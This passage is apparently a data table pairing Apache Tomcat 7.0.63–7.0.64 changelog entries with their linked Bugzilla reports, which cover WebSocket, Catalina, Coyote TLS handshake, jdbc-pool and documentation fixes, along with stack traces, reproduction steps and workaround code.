1. no-tagtest.jsp that uses the <catch> and other jstl tags directly in the jsp
2. tagtest.jsp that references a custom tag that uses the <catch> and other jstl tags.

The problem seems to be that when a custom tag uses any other tags, then the page context is an instance of JspContextWrapper. When resolving el expressions, the JspContextWrapper.getElContext() returns an ELContext for the rootContext, rather than the page context. In this example, the <catch> tag saves the exception as an attribute named ""error"" in the page context attributes (the page context will be an instance of JspContextWrapper). However, when the ""error"" variable is referenced later in an EL expression, the EL mechanism has a page context that is the root context of the JspContextWrapper and thus can't resolve that variable."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58178
WebSocket|Tomcat 7.0.64 (violetagg)|fix|58166|Allow applications to send close codes in the range 3000-4999 inclusive. (markt)|Tomcat does not support application-specific close codes|"org.apache.tomcat.websocket.Util.getCloseCode() converts codes between 3000 and 4999 to 1000. This behaviour is non-standard and differs from the behaviour of javax.websocket.CloseReason$CloseCodes which returns the correct close codes.


            return new CloseReason.CloseCode() {
                @Override
                public int getCode() {
                    return code;
                }
            };"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58166
WebSocket|Tomcat 7.0.64 (violetagg)|fix|58232|Avoid possible NPE when adding endpoints programmatically to the javax.websocket.server.ServerContainer. Based on a patch provided by bastian.(violetagg)|PojoMethodMapping needed - Programatically adding ServerEndpointConfig not possible|"Hello,

I'm currently trying to register my own WebsocketEndpoint programatically, i.e. not using the annotations. JSR-356 says this is possible by using the ServerContainer which can be obtained from the ServletContext (see section 6.4). 
The ServerContainer provides two methods that can be used to add a new endpoint. I do not want to use the one that takes a Class<?>, but I need to use the one that takes a ServerEndpointConfig. This is because I want to add some UserProperties to the ServerEndpointConfig before it is added - and I cannot do that when using the method that takes the Class<?>.

When I'm doing this and try it, I get the following exception:

Aug 11, 2015 2:23:52 PM org.apache.coyote.AbstractProtocol$AbstractConnectionHandler process
SEVERE: Error reading request, ignored
java.lang.NullPointerException
	at org.apache.tomcat.websocket.pojo.PojoEndpointBase.doOnOpen(PojoEndpointBase.java:59)
	at org.apache.tomcat.websocket.pojo.PojoEndpointServer.onOpen(PojoEndpointServer.java:70)
	at org.apache.tomcat.websocket.server.WsHttpUpgradeHandler.init(WsHttpUpgradeHandler.java:138)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:696)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1521)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1478)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Thread.java:745)


When looking at the source of Tomcat, it seems that the method taking the Class<?> adds a userProperty to the ServerEndpointConfig, which contains an instance of PojoMethodMapping. This is not done when directly calling the method that takes the ServerEndpointConfig - and exactly that PojoMethodMapping seems to be missing in my case.

As PojoMethodMapping is not defined by the JSR, but is a Tomcat class, I  would like to not instantiate it myself, but I think the instantiation of PojoMethodMapping should be done in Tomcat in the method taking the ServerEndpointConfig, as the one with the Class<?> parameter calls that one anyway.

I patched tomcat locally and it seems to work for me after that adjustment. I therefore propose that this adjustment be integrated into trunk.
I will upload my changes to GitHub right away and add a comment with the link here.


Thanks,
Basti"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58232
Web applications|Tomcat 7.0.64 (violetagg)|fix||Correct the incorrect document of QueryTimeoutInterceptor. The setting value is not in milliseconds but in seconds. (kfujino)|||
Web applications|Tomcat 7.0.64 (violetagg)|fix|58112|Update the documentation for using the Catalina tasks in an Apache Ant build file. (markt)|o.a.c.ant.DeployTask depends on o.a.tomcat.util.* - packaging or documentation issue ?|"Hi,

While I was looking at issue 58086 I found that o.a.c.ant.DeployTask depends on o.a.tomcat.util.*

java.lang.NoClassDefFoundError: org/apache/tomcat/util/buf/B2CConverter
        at org.apache.catalina.ant.AbstractCatalinaTask.execute(AbstractCatalinaTask.java:202)
        at org.apache.catalina.ant.DeployTask.execute(DeployTask.java:195)
        at org.apache.tools.ant.UnknownElement.execute(UnknownElement.java:291)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:606)
        at org.apache.tools.ant.dispatch.DispatchUtils.execute(DispatchUtils.java:106)
        at org.apache.tools.ant.Task.perform(Task.java:348)
        at org.apache.tools.ant.Target.execute(Target.java:392)
        at org.apache.tools.ant.Target.performTasks(Target.java:413)
        at org.apache.tools.ant.Project.executeSortedTargets(Project.java:1399)
        at org.apache.tools.ant.Project.executeTarget(Project.java:1368)
        at org.apache.tools.ant.helper.DefaultExecutor.executeTargets(DefaultExecutor.java:41)
        at org.apache.tools.ant.Project.executeTargets(Project.java:1251)
        at org.apache.tools.ant.Main.runBuild(Main.java:811)
        at org.apache.tools.ant.Main.startAnt(Main.java:217)
        at org.apache.tools.ant.launch.Launcher.run(Launcher.java:280)
        at org.apache.tools.ant.launch.Launcher.main(Launcher.java:109)
Caused by: java.lang.ClassNotFoundException: org.apache.tomcat.util.buf.B2CConverter
        at java.net.URLClassLoader$1.run(URLClassLoader.java:366)
        at java.net.URLClassLoader$1.run(URLClassLoader.java:355)
        at java.security.AccessController.doPrivileged(Native Method)
        at java.net.URLClassLoader.findClass(URLClassLoader.java:354)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:425)
        at java.lang.ClassLoader.loadClass(ClassLoader.java:358)
        ... 19 more

According to the documentation one needs only catalina-ant.jar [1]

""Copy the file server/lib/catalina-ant.jar from your Tomcat installation into Ant's library directory ($ANT_HOME/lib).""

Is this a packaging issue or a documentation issue?

Regards,
Violeta

[1] http://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html#Executing_Manager_Commands_With_Ant"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58112
Web applications|Tomcat 7.0.64 (violetagg)|fix||Improve the Javadoc for some of the APR socket read functions that have inconsistent behaviour for return values. (markt)|||
Web applications|Tomcat 7.0.64 (violetagg)|add|58255|Document the Semaphore valve. Patch provided by Kyohei Nakamura. (markt)|Semaphore valve document is not existent|"Created attachment 33007 [details]
patch against trunk.

The Semaphore Valve does not exist in the Valve configuration document.
Therefore, I created a document."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58255
jdbc-pool|Tomcat 7.0.64 (violetagg)|fix||Fix potential NPE in QueryTimeoutInterceptor. (kfujino)|||
jdbc-pool|Tomcat 7.0.64 (violetagg)|fix||Add support for stopping the pool cleaner via JMX. (kfujino)|||
jdbc-pool|Tomcat 7.0.64 (violetagg)|fix||The fairness attribute and ignoreExceptionOnPreLoad attribute do not allow a change via JMX. (kfujino)|||
jdbc-pool|Tomcat 7.0.64 (violetagg)|fix||If the timeBetweenEvictionRunsMillis attribute is changed via jmx, it should restart the pool cleaner because this attribute affects the execution interval of the pool cleaner. (kfujino)|||
jdbc-pool|Tomcat 7.0.64 (violetagg)|fix||Eliminate the dependence on maxActive of busy queues and idle queue in order to enable the expansion of the pool size via JMX. (kfujino)|||
Other|Tomcat 7.0.64 (violetagg)|fix||Update sample Eclipse IDE configuration to exclude test/webapp* and similar paths from compiler sourcepath. (kkolinko)|||
Catalina|Tomcat 7.0.63 (violetagg)|fix|57938|Correctly handle empty form fields when a form is submitted as multipart/form-data, the maxPostSize attribute of the Connector has been set to a negative value and the Context has been configured with a value of true for allowCasualMultipartParsing. The meaning of the value zero for the maxPostSize has also been changed to mean a limit of zero rather than no limit to align it with maxSavePostSize and to be more intuitive. (markt)|"HttpServletRequest.getParts causes NPE when allowCasualMultipartParsing set ""true"" and multipart field is empty"|"Created attachment 32745 [details]
Sample project to reproduce bug

When sending a HTML form as multipart/form-data, if allowCasualMultipartParsing is set to True and any form field is empty, calling HttpServletRequest.getParts() causes NullPointerException.

19-May-2015 23:30:59.912 SEVERE [http-nio-8512-exec-14] org.apache.catalina.core.StandardWrapperValve.invoke Servlet.service() for servlet [post] in context with path [/test] threw exception
java.lang.NullPointerException
	java.lang.String.<init>(String.java:479)
	org.apache.tomcat.util.http.fileupload.disk.DiskFileItem.getString(DiskFileItem.java:321)
	org.apache.catalina.connector.Request.parseParts(Request.java:2758)
	org.apache.catalina.connector.Request.getParts(Request.java:2641)
	org.apache.catalina.connector.RequestFacade.getParts(RequestFacade.java:1083)
	com.multipart.emptytest.post.doPost(post.java:25) (<--- HttpServletRequest.getParts() here)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:648)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:729)
	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
	...


To Reproduce Bug:

1) Set allowCasualMultipartParsing to ""true"" in context.xml,
2) Create a HTML form with enctype=""multipart/form-data"",
3) Submit the form it to a servlet that calls HttpServletRequest.getParts(),
4) If you leave any field empty in the form you will get a NPE.

Expected Results: 

Whether there is an empty field or not HttpServletRequest.getParts() should complete without any exceptions. Empty fields should return empty Part objects.

Actual Results:

Got NPE.

Additional Information: 

Whether allowCasualMultipartParsing is true or false if the servlet is annotated as @MultipartConfig, error disappears and HttpServletRequest.getParts() behaves as expected. But since sole purpose of allowCasualMultipartParsing is the opportunity of using getParts() in a ServletFilter, this is not a solution.

A sample project to reproduce bug in attachment."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57938
Catalina|Tomcat 7.0.63 (violetagg)|add|54618|Add a new HttpHeaderSecurityFilter that adds the Strict-Transport-Security, X-Frame-Options and X-Content-Type-Options HTTP headers to the response. (markt)|Add filter implementing HTTP Strict Transport Security (HSTS) [PATCH]|"Created attachment 30000 [details]
The actual filter

The specification for HTTP Strict Transport Security (HSTS) has now been published (RFC 6797). Tomcat should include a filter implementing the specification to make it easy to add to web applications.

I have attached an implementation suggestion."|https://bz.apache.org/bugzilla/show_bug.cgi?id=54618
Catalina|Tomcat 7.0.63 (violetagg)|fix||Add a workaround for issues with SPNEGO authentication when running on Java 8 update 40 and later. The workaround should be safe for earlier Java versions but it can be disabled with the applyJava8u40Fix attribute of the SPNEGO authenticator if necessary. (markt)|||
Catalina|Tomcat 7.0.63 (violetagg)|add|57154|Add support for web applications (Context elements) that do not have a docBase. This is primarily for use when embedding but it also fixes a rare issue when running the unit test. Patch provided by Huxing Zhang. (markt)|Failure of TestWsWebSocketContainer when directory %TEMP%\test exists|"Steps to reproduce:
1) Go to the temporary directory (System.getProperty(""java.io.tmpdir"")) and create a directory named ""test"" there.
2) Run org.apache.tomcat.websocket.TestWsWebSocketContainer test case with Nio or Nio 2.

The following two test cases are failing: 
testWriteTimeoutServerEndpoint
testWriteTimeoutServerContainer

Cause of the failure is the following ERROR:
The HTTP response from the server [HTTP/1.1 302 Found
] did not permit the HTTP upgrade to WebSocket
javax.websocket.DeploymentException: The HTTP response from the server [HTTP/1.1 302 Found
] did not permit the HTTP upgrade to WebSocket

This test case configures DefaultServlet and tries to access
""ws://localhost:"" + getPort() + ""/test"".

I suspect that Mapper responds with 302 redirect before the upgrade request reaches web application.

This issue is observed at Buildbot. See
TEST-org.apache.tomcat.websocket.TestWsWebSocketContainer.NIO.txt
TEST-org.apache.tomcat.websocket.TestWsWebSocketContainer.NIO2.txt
files in http://ci.apache.org/projects/tomcat/tomcat8/logs/1634329/"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57154
Catalina|Tomcat 7.0.63 (violetagg)|fix|57959|Fixed deadlock in org.apache.juli.FileHandler when log is rotated. (violetagg)|Deadlock in FileHandler.java when log is rotated|"Tomcat 7 will deadlock when a log file is rotated.  This issue has been fixed in latest tomcat 6 and tomcat 8 but not in tomcat 7.

The issue is in following code (apache-tomcat-7.0.62-src/java/org/apache/juli/FileHandler.java:188)


                } finally {
                    writerLock.writeLock().unlock();
                    // Down grade to read-lock. This ensures the writer remains valid
                    // until the log message is written
                    writerLock.readLock().lock();
                }
            }


Despite the comment the order is wrong, you have to acquire a read lock then release write lock to make sure the race condition does not occur.

The correct way to do it is:

                } finally {
                    writerLock.readLock().lock();
                    writerLock.writeLock().unlock();
                }
            }

In tomcat 6 (apache-tomcat-6.0.44-src/java/org/apache/juli/FileHandler.java:187) and tomcat 8 (apache-tomcat-8.0.22-src/java/org/apache/juli/FileHandler.java:186) the order is correct."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57959
Catalina|Tomcat 7.0.63 (violetagg)|fix|57977|Correctly bind and unbind the web application class loader during execution of the PersistentValve. (markt)|The original class loader isn't re-bound to the thread in PersistentValve.invoke()|"Created attachment 32769 [details]
patch against trunk

In PersistentValve.invoke(Request, Response) method, The Webapp class loader has been bound to the current thread.
However, the original class loader that had been used before bind isn't restored to the thread.
The original class loader should be re-bound to the thread."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57977
Catalina|Tomcat 7.0.63 (violetagg)|fix|58023|Fix potentially excessive memory usage due to unnecessary caching of JAR manifests in the web application class loader. (markt)|Memory Leak in WebappClassLoader|"Memory leak occur because a reference of entry.manifest is never removed.

Problem:
1 - ${class}.class.getResource( ${resource.name1} );
2 - JarFile load a manifest.
3- resourceEntries put a new ResourceEntry with a manifest reference.
4 - ${class}.class.getResource( ${resource.name2} );
5 - resourceEntries put a new ResourceEntry with a manifest reference. Manifest contains ~20MB, but, no problem because the JarFile is the same reference. In other words, only one Manifest in the Heap space.
6 - wait for 90000 milliseconds.
7 - ${class}.class.getResource( ${resource.name3} );
8 - WebappClassLoader.closeJARs because time is elapsed 90000 milliseconds and load a new JarFile instances.
9 - JarFile load a new manifest.
10 - resourceEntries put a new ResourceEntry with a new manifest reference.
11 - wait for 90000 milliseconds
...
And this will be memory leak in little time (See resourceEntries.png).
In attachment, a scenario to simulate this problem.

PS.: A jar file need to be signed for accelerate leak, because of Manifest.entries ~5MB (see manifests.png) retained heap (in test case, but, my real app is ~20MB).
I attached the heap dump used in this test case (heap.zip).

Solution:
Always release the manifest reference.

Workaround:
public class WebappClassLoader
    extends 
        org.apache.catalina.loader.WebappClassLoader
{
    @Override
    public InputStream getResourceAsStream( String name )
    {
        InputStream in = super.getResourceAsStream( name ); 
        
        ResourceEntry entry = resourceEntries.get( name );
        
        if ( entry != null )
        {
            // prevent a memory leak
            entry.manifest = null;
            entry.certificates = null;
        }
        
        return in;
    }
    
    @Override
    public URL getResource( String name )
    {
        URL url = super.getResource( name );
        
        ResourceEntry entry = resourceEntries.get( name );
        
        if ( entry != null )
        {
            // prevent a memory leak
            entry.manifest = null;
            entry.certificates = null;
        }
        
        return url;
    }
}"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58023
Catalina|Tomcat 7.0.63 (violetagg)|fix|57700|Ensure that Container event ADD_CHILD_EVENT will be sent in all cases. (violetagg)|Exception in a LifecycleListener on Context makes webapp unreachable in spite of subsequent successful startups|"Using Tomcat 7.0.59.
I have an implementation of LifecycleListener that is configured in META-INF/context.xml of a web application and performs some configuration work on CONFIGURE_START_EVENT.

Roughly:
[[[
import org.apache.catalina.Context;
import org.apache.catalina.Lifecycle;
import org.apache.catalina.LifecycleEvent;
import org.apache.catalina.LifecycleListener;

public class FooListener implements LifecycleListener {
  @Override
  public void lifecycleEvent(LifecycleEvent event) {
    if (event.getLifecycle() instanceof Context) {
      if (Lifecycle.CONFIGURE_START_EVENT.equals(event.getType())) {
        if (loader == null) {
          Context context = (Context) event.getLifecycle();
          try {
             // <Do some work...>
          } catch (Exception ex) {
            final String msg = ""Configuration failed for web application \"""" + context.getName()
                + ""\""."";
            throw new ConfigurationException(msg, ex);
          }
        }
      }
    }
  }
}
]]]

The work of the listener can fail due to some external condition.

Steps to reproduce:
All the following is performed via HTML UI of the Manager web application.
1. Undeploy application foo.
2. Upload foo.war.
3. The external condition is not configured.
The following is observed:
- The application fails to start.
- A org.apache.catalina.LifecycleException happens and is logged into catalina.dddd-yy-mm.log
- The Manager app shows the application as deployed and is in ""stopped"" state.

This all is as expected.

4. Fix the external condition and start the web application via Manager.
Observed behaviour:
- The application is started. The manager webapp shows that it is started and running.

Expected behaviour:
- Being able to access /foo

Actual behaviour:
- Error 404. The access log shows that the request was served by the ROOT web application.
- No errors or warnings are logged

If I stop/start the foo application, it stops and starts successfully, but nothing changes.
If I stop/start the ROOT application, it stops and starts successfully, but nothing changes.

If I undeploy and re-deploy the foo application, the situation resolves and the application can be accessed successfully.


Thoughts:
----------
1. Maybe the error is in Mapper. Maybe the error is handling of FailedContext. 

The initial error may be a deployment error (resulting in use of FailedContext), but in this case it is odd that starting the application (after fixing the external condition) is performed successfully and it is shown as running.

If the error is in the Mapper, why the error is fixed when the application is undeployed?

2. We already have test cases for failed startups,
org.apache.catalina.core.TestStandardContext
-> testBug46243()
-> testWebappLoaderStartFail()
-> testWebappListenerConfigureFail()

The testWebappListenerConfigureFail() test was designed to reflect this situation. I guess there is a difference in deployment scenario via Manager webapp vs. the one used in the test.

3. I wonder, if the Manager webapp had a ""[Redeploy]"" button for a webapp, like it has a ""[Reload]"" one, would pressing it be able to resolve this issue. I will file an enhancement request for that."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57700
Catalina|Tomcat 7.0.63 (violetagg)|fix||Add configuration fields for header names in SSLValve. (remm)|||
Coyote|Tomcat 7.0.63 (violetagg)|fix|57265|Further fix to address a potential threading issue for NIO when sendfile is used in conjunction with TLS. (markt)|Tomcat 8 hiden behind NGINX fails to send file when using NIO connector|"We have moved Tomcat 8 server behind the nginx balancing server and have started  experiencing this problem:

org.apache.tomcat.util.net.NioEndpoint$NioBufferHandler@2001a157
26-Nov-2014 11:37:04.476 SEVERE [http-nio-8443-ClientPoller-0] org.apache.tomcat.util.net.NioEndpoint$Poller.processSendfile 
 java.lang.IllegalArgumentException: You can only read using the application read buffer provided by the handler.
at org.apache.tomcat.util.net.SecureNioChannel.write(SecureNioChannel.java:489)
at sun.nio.ch.FileChannelImpl.transferToArbitraryChannel(FileChannelImpl.java:534)
at sun.nio.ch.FileChannelImpl.transferTo(FileChannelImpl.java:583)
at org.apache.tomcat.util.net.NioEndpoint$Poller.processSendfile(NioEndpoint.java:1200)
at org.apache.tomcat.util.net.NioEndpoint$Poller.processKey(NioEndpoint.java:1122)
at org.apache.tomcat.util.net.NioEndpoint$Poller.run(NioEndpoint.java:1087)
at java.lang.Thread.run(Thread.java:745)


Problem occurres irregularly when loading lots of scripts refencenced by homepage.
It seems to be ok with useSendfile=false. I have tried to add some slow logging (with flushing output) to code and it lowers occurrence rate, so it looks like some race condition problem."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57265
Coyote|Tomcat 7.0.63 (violetagg)|fix|57931|Ensure that TLS connections with the NIO HTTP connector that experience issues during the handshake (e.g. missing or invalid client certificate) are closed cleanly and that the client receives the correct error code rather than simply closing the connection. (markt)|NIO connector incorrectly closes connection when client certificate verification fails|"Created attachment 32738 [details]
Test program to reproduce the issue

If tomcat is set to use TLS and clientAuth=""want"" or clientAuth=""true"", it appears the NIO connector closes the connection in response to an untrusted client certificate.  This behavior differs from the BIO connector, and violates RFC 5246, which states that a fatal alert must be provided if ""some aspect of the cert chain was unacceptable"".  By closing the connection, this causes OpenSSL to provide an obscure error ""Unexpected EOF"", which indicates the TLS protocol was violated.

I have attached a Python test program which demonstrates this behavior.  Simply run this program against a tomcat server, configured with the given server.xml Connector shown below.  Removal of the protocol attribute will use the BIO connector, and inclusion of the protocol attribute will demonstrate the NIO connector.


Steps to reproduce:
1) Setup a tomcat server with the connector configuration shown below
2) Install Python as well as pyOpenSSL
3) (If necessary) Modify the test.py program to communicate with the appropriate server and port.
4) Run the test.py program.
(Alternatively, if Python is not available, you should be able to use 


Desired behavior:
Instead of closing the connection, the NIO connector should provide a fatal error response to an invalid certificate, like the BIO connector.  

I would strongly prefer if the response would match the response provided by Java through the BIO connector: ""alert certificate unknown"".  This would allow our program to use either connector without any changes.


Impact:
Due to this bug, when using the NIO connector, our program cannot differentiate between an unexpected network problem and a certificate issue during the handshake.  Because of this, the program is not able to flag and react to the possibility the certificate is invalid--it assumes an unexpected network error occurred.



RFC 5246, 7.4.6.  Client Certificate:
If the client does not send any certificates, the
server MAY at its discretion either continue the handshake without
client authentication, or respond with a fatal handshake_failure
alert.  Also, if some aspect of the certificate chain was
unacceptable (e.g., it was not signed by a known, trusted CA), the
server MAY at its discretion either continue the handshake
(considering the client unauthenticated) or send a fatal alert.


NIO Connector (Incorrect behavior):
python test.py
Connecting...
Performing SSL handshake...
Traceback (most recent call last):
  File ""test.py"", line 18, in <module>
    conn.do_handshake()
OpenSSL.SSL.SysCallError: (-1, 'Unexpected EOF')


BIO connector (Correct behavior):
python test.py
Connecting...
Performing SSL handshake...
Traceback (most recent call last):
  File ""test.py"", line 18, in <module>
    conn.do_handshake()
  File ""build/bdist.linux-x86_64/egg/OpenSSL/SSL.py"", line 1442, in do_handshake
  File ""build/bdist.linux-x86_64/egg/OpenSSL/SSL.py"", line 1187, in _raise_ssl_error
  File ""build/bdist.linux-x86_64/egg/OpenSSL/_util.py"", line 48, in exception_from_error_queue
OpenSSL.SSL.Error: [('SSL routines', 'SSL3_READ_BYTES', 'sslv3 alert certificate unknown')]




Connector Configuration:
<Connector port=""10443"" maxHttpHeaderSize=""4096""
           maxThreads=""75"" minSpareThreads=""25""
           maxKeepAliveRequests=""-1""
           keepAliveTimeout=""180000""
           enableLookups=""false"" disableUploadTimeout=""true""
           acceptCount=""10"" scheme=""https"" secure=""true"" SSLEnabled=""true""
           clientAuth=""want"" sslProtocol=""TLS"" sslEnabledProtocols=""TLSv1.2,TLSv1""
           connectionTimeout=""10000""
           protocol=""org.apache.coyote.http11.Http11NioProtocol""
           keystoreFile=""example.keystore""
           keystorePass=""example"" algorithm=""SunX509""
           truststoreFile=""example.keystore""
           truststorePass=""example""
           truststoreType=""JKS""
           keyAlias=""tomcat""
           compression=""on""
           compressionMinSize=""2048""
           ciphers=""TLS_DHE_RSA_WITH_AES_128_CBC_SHA""/>"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57931
Coyote|Tomcat 7.0.63 (violetagg)|add|57943|Added a work-around to catch ConcurrentModificationExceptions during Poller timeout processing that were causing the Poller thread to stop. The root cause of these exceptions is currently unknown. (markt)|NioEndpoint, one poller  thread died|"when i restart tomcat,the tomcat can not process request soonÔºåi find an error log

Exception in thread ""http-nio-7001-ClientPoller-1"" java.util.ConcurrentModificationException
        at java.util.HashMap$HashIterator.nextEntry(HashMap.java:793)
        at java.util.HashMap$KeyIterator.next(HashMap.java:828)
        at java.util.Collections$UnmodifiableCollection$1.next(Collections.java:1010)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.timeout(NioEndpoint.java:1421)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.run(NioEndpoint.java:1215)
        at java.lang.Thread.run(Thread.java:662)

tomcat poller thread is not catch this exception,so this thread is died.
connection is accept but has no poller thread to process."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57943
Coyote|Tomcat 7.0.63 (violetagg)|fix||Fix possible very long (1000 seconds) timeout with APR/native connector. (markt)|||
Coyote|Tomcat 7.0.63 (violetagg)|add||"Support ""-"" separator in the SSLProtocol configuration of the APR/native connector for protocol exclusion. (rjung)"|||
Cluster|Tomcat 7.0.63 (violetagg)|fix||Make sure that stream is closed after using it in DeltaSession.applyDiff(). (kfujino)|||
WebSocket|Tomcat 7.0.63 (violetagg)|add|57676|List conflicting WebSocket endpoint classes when there is a path conflict. Based upon a patch proposed by yangkun. (schultz)|WebSocket check same path endpoint implementation enhancement|"If there are two websocket endpoint has same path, eg, path is ""/"",Tomcat start will report the following errors:

Multiple Endpoints may not be deployed to the same path [/]
...

  But the errors info can't provide us more enough info.We can't know which the two endpoints.If so,we may need to search texts,I think not very convenient.
  If report the following errors info, we can know which two endpoints:

Multiple Endpoints may not be deployed to the same path [/], the first endpoint is [echo.EchoServer], the second endpoint is [echo.annoted.EchoServer]

  
  The simple way is to modify WsServerContainer#addEndpoint() method and org/apache/tomcat/websocket/server/LocalStrings.properties.

  example:

#serverContainer.duplicatePaths=Multiple Endpoints may not be deployed to the same path [{0}]
serverContainer.duplicatePaths=Multiple Endpoints may not be deployed to the same path [{0}], the first endpoint is [{1}], the second endpoint is [{2}]


if (old != null) {
// Duplicate path mappings
	throw new DeploymentException(sm.getString(""serverContainer.duplicatePaths"", path, old.getEndpointClass().getName(), sec.getEndpointClass().getName()));
}"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57676
WebSocket|Tomcat 7.0.63 (violetagg)|add||Extend support for the permessage-deflate extension to the client implementation.|||
WebSocket|Tomcat 7.0.63 (violetagg)|fix|57969|Provide path parameters to POJO via per session javax.websocket.server.ServerEndpointConfig as they vary between different requests. (violetagg)|@PathParam annotation captures incorrect value under high load|"Under high load, given a @ServerEndpoint like


@ServerEndpoint(value=""/websocket/{key}"", configurator=MyConfigurator.class)
public class ExecutionMonitoringEndpoint{
...
@OnMessage
public void onMessage(@PathParam(""key"") String key, String payload) {
   ...
}
}
//where MyConfigurator is used to only inject a custom property like ServerEndpointConfig.conf.getUserProperties().put(...);

we noticed that the captured PathParam (""key"" in this case) was sometimes mixed up with another concurrent request - causing double subscriptions in our pub/sub application.


Changing the above to

@ServerEndpoint(value=""/websocket/{key}"", configurator=MyConfigurator.class)
public class ExecutionMonitoringEndpoint{
...
@OnMessage
public void onMessage(Session session, String payload) {
  String key = session.getPathParameters().get(""key"");
}
}

fixed the problem."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57969
WebSocket|Tomcat 7.0.63 (violetagg)|fix|57974|Session.getOpenSessions should return all sessions associated with a given endpoint instance, rather than all sessions from the endpoint class. (remm)|getOpenSessions() bug|"the method getOpenSessions() in the class Session return sessions that are not bound with the endpoint.

In my case I have 2 Endpoints one working with a login/password(go through request.login ) the other not.
When requesting the open sessions for the ""logged"" one i get even the session of the others.
The specification said that getOpenSessions() return the opened sessions of only one endpoint"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57974
Web applications|Tomcat 7.0.63 (violetagg)|fix|57282|Update request processing sequence diagrams. Updated diagrams provided by Stephen Chen. (markt)|request process UML diagram seems outdated|"apache-tomcat-7.0.56/webapps/docs/architecture/requestProcess/requestProcess.pdf


it is about the request process UML diagram, I have been reading tomcat 7.0.56 source code for weeks, and along with source code reading along with debug which helps so much, and one day after I debgued the whole end-to-end request flow, I found that the document seems is derived from Tomcat 5(please check the footer of the pdf).

and there are few steps on the diagram which are different from my finding/debuging.

Please kindly check attachments, thanks!"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57282
Web applications|Tomcat 7.0.63 (violetagg)|fix|57971|Correct the documentation for the cluster configuration setting recoverySleepTime. (markt)|Description of recoverySleepTime doesn't correspond with the implementation|"Created attachment 32765 [details]
patch against trunk.

Description of recoverySleepTime attribute in Membership doc says ""...until we either recovered successfully or we have reached the recoveryCounter limit"".
However, there is no ""until reached the recoveryCounter limit"" in the implementation.
I fix the document to match the implementation."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57971
Web applications|Tomcat 7.0.63 (violetagg)|add|57758|Add document of testOnConnect attribute in jdbc-pool doc. (kfujino)|Validator and initSQL are misbehaving|"Saying it simply: 

Validator + initSQL = no initSQL executed. 
Validator + no initSQL = no Validator executed on init 

To be clear, setting Validator and initSQL results in initSQL actually not being executed. But setting Validator without initSQL results in Validator not being executed on initialization. This means, that if we want to use custom Validator and initSQL, we need to execute initSQL in the validator (as advised in #1) but still set some initSQL into datasource with some nonsense like:

    setValidator(new Jdbc4Validator(config.initSql));
    setInitSQL(""Oracle has products and solutions for every role in the enterprise"");


See PooledConnection#validate(int, String), and PooledConnection.doValidate(int) for VALIDATE_INIT in tomcat-jdbc-8.0.9.

#1 http://mail-archives.apache.org/mod_mbox/tomcat-users/201412.mbox/%3CCAAjH2Utn2KL_nzQRCy=0MPXmTQVfLwLidir_5S9w6O6Z7MELmQ@mail.gmail.com%3E"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57758
Web applications|Tomcat 7.0.63 (violetagg)|add||Add description of validatorClassName attribute to testXXXX attributes in jdbc-pool docs. (kfujino)|||
Tribes|Tomcat 7.0.63 (violetagg)|fix||Ensure that the state transfer flag is updated to true only when the map states have been transferred correctly from existing map members. (kfujino)|||
Tribes|Tomcat 7.0.63 (violetagg)|fix||Do not set the nodes that failed to replication to the backup nodes. Ensure that the nodes that the data has been successfully replicated are set to the backup node. (kfujino)|||
Tribes|Tomcat 7.0.63 (violetagg)|fix||When failed to replication, rather than all member is handled as a failed member, exclude the failure members from backup members. (kfujino)|||
jdbc-pool|Tomcat 7.0.63 (violetagg)|fix||Refactoring of the removeOldest method in SlowQueryReport to behave as expected. (kfujino)|||
jdbc-pool|Tomcat 7.0.63 (violetagg)|fix|57783|Fix NullPointerException in SlowQueryReport. To avoid this NPE, Refactor SlowQueryReport#removeOldest and handle the abandoned connection properly. (kfujino)|NPE in SlowQueryReport - getQueryStats() returning null|"I'm running Tomcat 7.0.52 (7.0.52-1ubuntu0.1) with jdbc-pool and I see this exception in catalina.out somewhat frequently:

Mar 30, 2015 11:44:44 PM org.apache.tomcat.jdbc.pool.interceptor.AbstractQueryReport createStatement
WARNING: Unable to create statement proxy for slow query report.
java.lang.NullPointerException
        at org.apache.tomcat.jdbc.pool.interceptor.SlowQueryReport.prepareStatement(SlowQueryReport.java:122)

As far as I can tell, it appears unrelated to #51582. In this case, some condition causes getQueryStats() to return null:

    public void prepareStatement(String sql, long time) {
